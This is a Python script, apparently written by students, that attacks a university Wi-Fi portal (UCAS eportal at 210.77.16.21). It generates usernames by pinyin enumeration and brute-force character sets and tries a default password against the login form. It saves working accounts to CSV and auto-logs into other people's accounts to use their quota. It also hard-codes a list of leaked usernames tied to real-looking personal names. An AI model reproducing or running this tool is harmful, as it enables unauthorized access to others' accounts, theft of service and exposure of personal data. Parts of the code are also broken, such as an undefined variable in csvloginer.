import requests, random, os, threading, sys, time, csv, datetime

#主界面函数

def advancedio():
    print(str(sys.argv)) #第0个一般是代码文件名本身
    if len(sys.argv) == 1: #如果直接运行，进入main
        main()
    else:
        if sys.argv[1] == '--info':
            info()
        elif sys.argv[1] == '--help':
            helper()
        elif sys.argv[1] == '--cc':
            inputlist = []
            for inputfile in sys.argv[3:]:
                inputlist.append(inputfile)
            csvcombiner(inputlist, output=sys.argv[2])
        else: #如果没有特殊argument，进入正常模式
            main()

def main():
    clear()
    print("""
==校园网小助手简体中文威力加强免安装绿色版 V2.12==

I/i/info    - 版本信息
H/h/help    - 帮助信息

T/t/tester  - 网络测试
L/l/loginer - 基本登录

F/f/finder  - 手动搜索
A/a/auto    - 自动搜索
C/c/csvio   - 表格交互

Q/q/quit    - 退出
    """)

    command = input("输入指令：")
    if command in ['I','i', "info"]:
        info()
    if command in ['H', 'h', "help"]:
        helper()
    elif command in ['F', 'f', "finder"]:
        finder()
    elif command in ['L', 'l', "loginer"]:
        loginer()
    elif command in ['T', 't', "tester"]:
        tester()
    elif command in ['A', 'a', "auto"]:
        automode()
    elif command in ['C', 'c', "csvio"]:
        csvio()
    elif command in ['Q','q',"quit"]:
        exit()

    input("任意键以返回主页")
    main()
    return

#网络交互工具函数

def searcher(username, password):

    """
    搜索函数，用于自动登录给定的用户密码
    如果登录成功会返回True
    如果登录失败会返回False

    主要贡献者：2018
    改编：2016

    :param username:
    :param pasword:
    :return True or False:
    """

    sys.setrecursionlimit(1000000000)
    ReqHead = {
        'Accept' : 'text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
        'Accept-Encoding' : 'gzip, deflate',
        'Accept-Language' : 'zh-Hans-CN, zh-Hans; q=0.8, ja; q=0.7, en-US; q=0.5, en; q=0.3, ru; q=0.2',
        'Cache-Control' : 'max-age=0',
        'Connection' : 'Keep-Alive',
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Host' : '210.77.16.21',
        'Upgrade-Insecure-Requests' : '1',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763'
        }

    ChkUrl = 'http://210.77.16.21/eportal/InterFace.do?method=login' #登录表单提交
    CisUrl = 'http://210.77.16.21:8080/eportal/interface/index_files/pc/portal.png' #用于获取Cookies
    OutUrl = 'http://210.77.16.21/eportal/InterFace.do?method=logout' #成功后登出以便下一次尝试

    ReqData = {
        'password' : password,
        'passwordEncrypt' : 'false',
        'userId' : username,
        'queryString' : 'wlanuserip%253D0bc386d9e643d188b011a0d00c9b5c40%2526wlanacname%253D5fcbc245a7ffdfa4%2526ssid%253D%2526nasip%253D2c0716b583c8ac3cbd7567a84cfde5a8%2526mac%253D53ba540bde596b811a6d5617a86fa028%2526t%253Dwireless-v2%2526url%253D2c0328164651e2b4f13b933ddf36628bea622dedcc302b30',
        }

    Cis = requests.get(CisUrl)
    Resp = requests.post(ChkUrl, headers = ReqHead, cookies = requests.utils.dict_from_cookiejar(Cis.cookies), data = ReqData) #提交登陆表单，并获取返回值

    if Resp.text.find('success') != -1: #如果登录成功
        if Resp.text.find('å½åå·²ç¨(') != -1: #如果是假成功
            quitter()
            return searcher(username, password)
        return [True, 'OK']
    elif Resp.text.find('fail') != -1: #如果登录失败
        if Resp.text.find('æ å¯ç¨å©ä½æµé!') != -1: #如果没有流量剩余
            return [True, 'no data left']
        elif Resp.text.find('ç¨æ·ä¸å­å¨,è¯·è¾å¥æ­£ç¡®çç¨æ·å!') != -1: #如果账号不存在
            return [False, 'account not exist']
        elif Resp.text.find('å¯ç ä¸å¹é,è¯·è¾å¥æ­£ç¡®çå¯ç !') != -1: #如果密码错误
            return [True, 'wrong password']
        else:
            return [False, '[Unknown] ' + str(Resp.text)]

def quitter():

    """
    退出函数，用于自动退出
    不知道是否能够成功

    主要贡献者：2018
    改编：2016

    :return Nothing:
    """

    sys.setrecursionlimit(1000000000)
    ReqHead = {
        'Accept' : 'text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
        'Accept-Encoding' : 'gzip, deflate',
        'Accept-Language' : 'zh-Hans-CN, zh-Hans; q=0.8, ja; q=0.7, en-US; q=0.5, en; q=0.3, ru; q=0.2',
        'Cache-Control' : 'max-age=0',
        'Connection' : 'Keep-Alive',
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Host' : '210.77.16.21',
        'Upgrade-Insecure-Requests' : '1',
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763'
        }

    ChkUrl = 'http://210.77.16.21/eportal/InterFace.do?method=login' #登录表单提交
    CisUrl = 'http://210.77.16.21:8080/eportal/interface/index_files/pc/portal.png' #用于获取Cookies
    OutUrl = 'http://210.77.16.21/eportal/InterFace.do?method=logout' #成功后登出以便下一次尝试

    ReqData = {
        'password' : 'password',
        'passwordEncrypt' : 'false',
        'userId' : 'username',
        'queryString' : 'wlanuserip%253D0bc386d9e643d188b011a0d00c9b5c40%2526wlanacname%253D5fcbc245a7ffdfa4%2526ssid%253D%2526nasip%253D2c0716b583c8ac3cbd7567a84cfde5a8%2526mac%253D53ba540bde596b811a6d5617a86fa028%2526t%253Dwireless-v2%2526url%253D2c0328164651e2b4f13b933ddf36628bea622dedcc302b30',
        }

    Cis = requests.get(CisUrl)
    Resp = requests.post(ChkUrl, headers = ReqHead, cookies = requests.utils.dict_from_cookiejar(Cis.cookies), data = ReqData) #提交登陆表单，并获取返回值

    End = Resp.text.find('\",\"result')
    ReqData = {
        'userIndex' : str(Resp.text)[14:End], #将用户ID填入表单
        }
    Resp = requests.post(OutUrl, headers = ReqHead, cookies = requests.utils.dict_from_cookiejar(Cis.cookies), data = ReqData) #提交登出表单
    return

#表格交互工具函数

def recorder_init(filename):
    with open(filename, 'w') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(['username', 'password', 'note'])
    print("已创建文件：" + filename)
    return

def recorder(filename, username, password, note):
    with open(filename, 'a') as csvfile:
        filenames = ['username', 'password', 'note']
        writer = csv.DictWriter(csvfile, fieldnames=filenames)
        writer.writerow({'username': username,
                         'password': password,
                         'note': note})
        return

def csvcombiner(inputlist, output):
    recorder_init(output)
    for inputfile in inputlist:
        with open(inputfile, 'r') as csvfile:
            reader = csv.reader(csvfile) #获得输入表数据
            for data in reader: #逐行读取载入数据
                if len(data) >= 3:
                    print(data)
                    if data[2] in ['OK','no data left']:
                        recorder(output, data[0], data[1], data[2])
        print("已载入（" + inputfile + "）")
    input("合并完成！回车继续")

def csvloginer(filename):
    with open(filename, 'r') as csvfile:
        reader = csv.reader(csvfile)
        del reader[0] #删除标题
        for data in reader:
            if len(data) >= 3:
                if searcher(Userdict['code'], 'ucas') == [True, 'OK']:
                    print(Userdict['name'] + '，您好！')
                    input("[成功]登录（" + data[0] + "|" + data[1] + "），回车以继续")
                else:
                    input("[失败]登录（" + data[0] + "|" + data[1] + "），回车以继续")
        print("已结束")

#遍历用户名工具函数

def usergenerator(no1, no2, no3, no4, mode):

    """
    生成中文拼音和随机字母组成的用户名

    :param no1 表示声母:
    :param no2 表示韵母:
    :param no3 表示第一位随机字母:
    :param no4 表示第二位随机字母:
    :param mode 选择姓名的次序:
    :return 返回用户名:
    """

    list1 = ['b', 'p', 'm', 'f', 'd',
             't', 'n', 'l', 'g', 'k',
             'h', 'j', 'q', 'x',
             'zh', 'ch', 'sh', 'r',
             'z', 'c', 's', 'y', 'w',
             ''] #声母表，共24个
    list2 = ['a', 'o', 'e', 'i', 'u',
             'v', 'ai', 'ei', 'ui',
             'ao', 'ou', 'iu', 'ie',
             've', 'er', 'an', 'en',
             'in', 'un', 'vn', 'ang',
             'eng', 'ing', 'ong',
             'ian', 'uan', 'van',
             'uen', 'iang', 'uang',
             'ueng', 'iong'] #韵母表，共32个
    list3 = ['a', 'b', 'c', 'd', 'e',
             'f', 'g', 'h', 'i', 'j',
             'k', 'l', 'm', 'n', 'o',
             'p', 'q', 'r', 's', 't',
             'u', 'v', 'w', 'x', 'y',
             'z'] #字母表， 共26个
    list4 = ['a', 'b', 'c', 'd', 'e',
             'f', 'g', 'h', 'i', 'j',
             'k', 'l', 'm', 'n', 'o',
             'p', 'q', 'r', 's', 't',
             'u', 'v', 'w', 'x', 'y',
             'z', ''] #字母表加空白， 共27个

    if mode == 1:
        username = list1[no1] + list2[no2] + list3[no3] + list4[no4]
    elif mode == 2:
        username = list3[no3] + list4[no4] + list1[no1] + list2[no2]
    else:
        print('No mode expected')

    return username

def newuserfinder(start, end, mode):

    log = open("log.txt", "w") #记录进度

    for no1 in range(start, end): #声母
        filename = 'record_mode-' + str(mode) + '_No_'+ str(no1) + \
                   "_" + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M') + '.csv'
        print()
        recorder_init(filename)
        for no2 in range(32): #韵母
            #recorder(filename, str(no1), str(no2), 'record milestone')
            print("\n总体进度：" + str(no2+1) + " of 32 （"
                  + datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "）")
            for no3 in range(26): #第一个随机字母
                for no4 in range(27): #第二个随机字母

                    username = usergenerator(no1, no2, no3, no4, mode)
                    result = searcher(username, 'ucas')

                    #进度条
                    percent = 1.0 * (1 + no4 + 27 * no3) / 702
                    sys.stdout.write("\r中间进度 {0}{1}{2}".format("|" * int(percent // 0.05),
                                                               '%.2f%%' % (percent * 100),
                                                               " (" + username + ")"))
                    sys.stdout.flush()
                    log.write(str(no1) + "-" + str(no2) + "-" + str(no3) + "-" + str(no4) + "-" + username + "\n")

                    if result[0]:
                        recorder(filename, username, 'ucas', result[1])
                        quitter()
                        print(' [成功] ' + username + ' (' + result[1] + ')')
                    #else:
                        #print('[Failed] ' + username)

    log.close()
    return

def namemaker(n, charlist):
    base = len(charlist)
    username = ""
    while n != 0:
        username = charlist[n%base] + username
        n=n//base
    return username

def traditionfinder(start, end, charlist):

    filename = 'record_mode-0_Between_' + str(start) + '-' + str(end) + \
               "_" + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M') + '.csv'
    recorder_init(filename)

    log = open("log.txt", "w")

    for n in range(start, end):

        username = namemaker(n, charlist)
        if '\n' not in username:
            result = searcher(username, 'ucas')

            #进度条显示
            percent = 1.0 * (n - start + 1) / (end - start)
            sys.stdout.write("\r进度 {0}{1}{2}".format("|" * int(percent // 0.05),
                                                       '%.2f%%' % (percent * 100),
                                                       " (" + username + ")"))
            sys.stdout.flush()

            if result[0]==True: #如果成功
                recorder(filename, username, 'ucas', result[1])
                quitter()
                print(' [成功] ' + username + ' (' + result[1] + ')')

            log.write(str(n) + "-" + username + "\n")

    print('\n' + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
    log.close()
    return

#用户交互函数

def finder():
    clear()
    print("""
==用户名搜索器 V2.2==

选择模式并且设定开始和结束参数
模式0 - 传统遍历搜索模式（加强版）
模式1 - 二到三字，先姓后名（例如，dingzl）
模式2 - 二到三字，先名后姓（例如，zlding）

模式0中：
通过完全遍历的方式跑遍用户名，比较消耗时间
可以选择基本、进阶和自定义模式，更多设置请见输入模式后的说明
已解决完整性问题
举例，进阶模式一位字符需要约10^2次遍历，两位10^4次左右，依此类推

模式1和2中：
开始和结束参数表示声母的选择，共有24个
输入结果是前闭后开区间，从0开始
例如，（0，3）是第0个、第1个和第2个声母，最大范围则是（0，24）

输出结果包括一个log文件和一个csv文件
log文件 - 记录运行状态，用于检查出现问题的位置
csv文件 - 记录运行结果，保存所有证认出的用户名
    """)
    mode = int(input('请输入模式参数（0/1/2）：'))
    if mode == 0:
        traditionfinderio()
    elif mode in [1,2]:
        start = int(input('请输入开始参数（0到23）：'))
        end = int(input('请输入结束参数（1到24）：'))
        print("==开始运行，网络断开==")
        newuserfinder(start,end ,mode)
    input('\n\n已完成，任意键以关闭')

def traditionfinderio():

    print("""
==传统模式进阶设置界面==

A/a - 基本模式，遍历数字和小写字母（26+10=36个）
B/b - 进阶模式，遍历数字、大小写字母和特殊符号（36+26+29=91个）
C/c - 自定义模式，输入自定义字符串（测试功能）

高级测试参数为四位数，分别代表开启/关闭遍历数字、小写字母、大写字母和特殊符号
例如：1100表示只开启数字和小写字母，1110表示开启所有字母和数字
错误的输入可能自动载入进阶模式
""")
    start = int(input('请输入开始参数：'))
    end = int(input('请输入结束参数：'))
    setting = input("请输入设置参数：")
    if setting.lower() == 'a': #基本模式转换
        setting = '1100'
    elif setting.lower() == 'b': #进阶模式转换
        setting = '1111'

    if setting.lower() == 'c': #自定义模式
        charstr = '\n' + input("请输入自定义字符串，回车结束：")
    else:
        charstr = '\n'
        if setting[0] != '0': #如果数字未关闭
            charstr = charstr + "0123456789"
        if setting[1] != '0': #如果小写字母未关闭
            charstr = charstr + "abcdefghijklmnopqrstuvwxyz"
        if setting[2] != '0': #如果大写字母未关闭
            charstr = charstr + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        if setting[3] != '0': #如果特殊符号未关闭
            charstr = charstr + "`~!@#$%^&*()-=_+[]{}|;:,./<>?"
            #去除了三个字符\\ ' "

    charlist = list(charstr)

    #确认运行设定
    print("==运行参数==\n从" + str(start) + '到' + str(end) + "\n字符串为：" + charstr[1:])
    if input("输入N/n返回搜索器，否则继续：").lower() == 'n':
        finder()
    else:
        print("==开始运行，网络断开==")
        traditionfinder(start,end,charlist)
    return

def loginer():
    clear()
    print("""
==自动登录器 V1.0==
本程序仅供学习编程语言和观摩校园网账号使用，请不要使用流量
如果账号内有余额，切勿使用！
    """)
    input("为了世界和平请不要外传！输入回车继续\n")

    userlist_original = [
        {'code': 'ri', 'name': '李成日'},
        {'code': 'wsb', 'name': '留学生信息管理系'},
        {'code': 'wle', 'name': '魏兰娥'},
        {'code': 'ybf', 'name': '严驳非'},
        {'code': 'czg', 'name': '崔志刚'},
        {'code': 'chl', 'name': '李长海'},
        {'code': 'hjl', 'name': '胡珏'},
        {'code': 'zhn', 'name': '张宁'},
        {'code': 'qjp', 'name': '齐敬平'},
        {'code': 'dsp', 'name': '杜少鹏'},
        {'code': 'zjq', 'name': '郑建全'},
        {'code': 'bbs', 'name': '学校BBS'},
        {'code': 'jhs', 'name': '金树衡'},
        {'code': 'tzs', 'name': '田宗漱'},
        {'code': 'cjt', 'name': '唐翠菊'},
        {'code': 'wdw', 'name': '王大伟'},
        {'code': 'gjx', 'name': '耿继秀'},
        {'code': 'huxa', 'name': '胡新爱'},
        {'code': 'yqhe', 'name': '何亚庆'},
        {'code': 'zhgf', 'name': '周桂芳'},
        {'code': 'lvxf', 'name': '吕小凤'},
        {'code': 'yuxg', 'name': '俞孝光'},
        {'code': 'wuzg', 'name': '武贞光'},
        {'code': 'hedh', 'name': '何东华'},
        {'code': 'xudj', 'name': '徐德举'},
        {'code': 'lilj', 'name': '黎柳君'},
        {'code': 'guhm', 'name': '古怀民'},
        {'code': 'gaom', 'name': '高明'},
        {'code': 'jcao', 'name': '曹洁'},
        {'code': 'xutr', 'name': '许庭瑞'},
        {'code': 'xxjs', 'name': '王燕芳'},
        {'code': 'xyhu', 'name': '胡晓予'},
        {'code': 'jzhu', 'name': '朱剑'},
        {'code': 'xkfw', 'name': '选课服务器'},
        {'code': 'lisw', 'name': '李纾维'},
        {'code': 'suhy', 'name': '苏洪玉'},
        {'code': 'zpwy', 'name': '刘伟'},
        {'code': 'smxy', 'name': '生命学院'},
        {'code': 'wuzz', 'name': '吴宗舟'},
        {'code': 'smhua', 'name': '华士鸣'},
        {'code': 'sunwb', 'name': '孙文博'},
        {'code': 'liujc', 'name': '刘建成'},
        {'code': 'renlc', 'name': '任鲁川'},
        {'code': 'hanrc', 'name': '韩瑞财'}
        ] #最初筛选的安全账号，已经泄漏

    userlist_extended = [
        {'code': 'yy', 'name': '杨扬'},
        {'code': 'lee', 'name': '李竞瑜'},
        {'code': 'soe', 'name': 'Dr.SintSoe'},
        {'code': 'lyh', 'name': '李永华'},
        {'code': 'rxj', 'name': '任希娟'},
        {'code': 'fyl', 'name': '费银玲'},
        {'code': 'lgm', 'name': '刘功明'},
        {'code': 'tom', 'name': 'tom'},
        {'code': 'hzm', 'name': '侯贞梅'},
        {'code': 'zwp', 'name': '赵卫平'},
        {'code': 'wrs', 'name': '李剑峰'},
        {'code': 'xut', 'name': '徐涛'},
        {'code': 'jzx', 'name': '吉祖雄'},
        {'code': 'sgy', 'name': '四公寓'},
        {'code': 'bpma', 'name': '马丙鹏'},
        {'code': 'maoj', 'name': '毛剑'},
        {'code': 'herj', 'name': '贺荣绵'},
        {'code': 'chun', 'name': 'CHUNJIANHO'},
        {'code': 'zzqq', 'name': '周琴'},
        {'code': 'lxxy', 'name': '联想学院'},
        {'code': 'wuyy', 'name': '吴英毅'},
        {'code': 'seema', 'name': 'SeemaMishira'},
        {'code': 'fanjb', 'name': '范静波'},
        {'code': 'guowb', 'name': '郭文兵'},
        {'code': 'morse', 'name': 'Cameron'},
    ] #补充了一些账号，可能比较危险

    userlist = userlist_original + userlist_extended

    random.shuffle(userlist) #随机登录，减少冲突的同时也增加趣味性
    for Userdict in userlist:
        if searcher(Userdict['code'], 'ucas') == [True, 'OK']:
            print(Userdict['name'] + '，您好！')
            if input('输入y或Y确认登录，否则继续：') == ('y' or 'Y'):
                exit()
            quitter()
    print("很抱歉！已经没有任何可用账号！")

def csvio():
    clear()
    print("""
==表格交互系统 V0.2==
C/c/combine - 合并表格
L/l/login   - 表格登录
    """)
    command = input("请输入模式（C/L）：")
    if command in ['C','c','combine']:
        output = input("请输入保存的文件名，以csv结尾：")
        inputlist = []
        while True:
            command = input("请输入读取的文件名，输入Q结束：")
            if command in ['q','Q']:
                csvcombiner(inputlist, output)
                exit()
            inputlist.append(command)
    elif command in ['L','l','login']:
        csvloginer(input("请输入读取的文件名："))
    else:
        csvio()

def tester():
    filename = 'test_record.csv'
    recorder_init(filename)
    result_list = []
    confirm_list = [
        "sb[False, 'account not exist']",
        "gl[True, 'wrong password']",
        "jzhu[True, 'no data left']",
        "libo[True, 'wrong password']",
        "liangaiping[True, 'wrong password']",
        "lxxy[True, 'no data left']",
        "baixy[True, 'OK']"
    ]
    for username in ['sb', 'gl', 'jzhu', 'libo', 'liangaiping', 'lxxy', 'baixy']:
        result = searcher(username, 'ucas')
        result_list.append(username + str(result))
        recorder(filename, username, 'ucas', result[1])
    quitter()
    if result_list == confirm_list:
        print("测试成功！可以使用")
        return True
    else:
        print("测试不成功！请检查运行环境或反馈bug")
        return False

def automode():
    clear()
    tester()
    command = int(input("""
==自动模式 (2019-06-25)==
先确认连接的是UCAS的WiFi
请输入1到6之间的数字："""))
    print("==开始运行，网络断开==")
    if command == 1:
        newuserfinder(0, 12, 1)
    elif command == 2:
        newuserfinder(12, 24, 1)
    elif command == 3:
        newuserfinder(0, 12, 2)
    elif command == 4:
        traditionfinder(0, 700000)
    elif command == 5:
        newuserfinder(12, 24, 2)
    elif command == 6:
        traditionfinder(700000, 1005001)
    else:
        input('什么玩意儿，输错了，任意键重开')
        automode()
    input('\n\n已结束，任意键以关闭')

#说明信息函数

def info():
    clear()
    print("""
= = = = = = = = = = = = = = = = =
版本和更新信息

【校园网小助手】
V1.00 - 20190625
    整合搜索函数和自动登录
V1.10 - 20190625
    增加测试功能
V1.11 - 20190625
    搜索器重大更新
V1.20 - 20190625
    增加自动模式
V1.30 - 20190626
    增加表格交互功能
V1.34 - 20190626
    增加命令行交互功能
V2.00 - 20190626
    初期稳定版
V2.10 - 20190626
    用户名搜索器升级

【用户名搜索器】
V1.0 - 20190625
    创建代码
V1.1 - 20190625
    尝试修复一些Bug，结束时需要确认关闭
V1.2 - 20190625
    增加了进度条，关闭了用户名显示，自动保存进度
V1.3 - 20190625
    实现实时更新进度条显示
V2.0 - 20190625
    增加了传统遍历模式，修改了模式名
V2.1 - 20190626
    加强了传统遍历模式，能够搜索更大量的信息
V2.2 - 20190626
    传统模式定制化改进，可以进行基本和进阶搜索

【自动登录器】
V0.5 - 20190103
    创建代码
V0.6 - 20190624
    由于程序泄露，增加一部分账号
V1.0 - 20190625
    整合到一个程序内

【表格交互器】
V0.1 - 20190626
    表格合并器和登录器
V0.2 - 20190626
    修复一些BUG

©2019 朝鲜世宗大王第一大学高材生团体. All rights reserved.
= = = = = = = = = = = = = = = = =
    """)

def helper():
    clear()
    print("""
= = = = = = = = = = = = = = = = =
帮助信息（直接使用命令行）

--cc   调用csvcombiner，之后输入一个输出文件和一个输入文件（使用linux更方便）
--help 帮助文档
--info 版本信息
= = = = = = = = = = = = = = = = =
    """)

def clear():
    os.system('clear')

advancedio()
